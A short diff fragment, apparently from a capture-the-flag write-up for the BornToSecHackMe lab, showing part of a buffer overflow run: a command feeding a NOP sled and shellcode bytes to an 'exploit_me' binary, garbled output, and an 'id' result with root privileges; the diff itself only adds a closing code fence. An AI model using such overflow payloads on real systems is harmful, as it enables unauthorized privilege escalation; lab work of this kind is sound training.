@@ -330,3 +330,4 @@ zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("\x90" * 50 + "\x31\xc0\x
              ̀1@̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP
 $ id
 uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+```
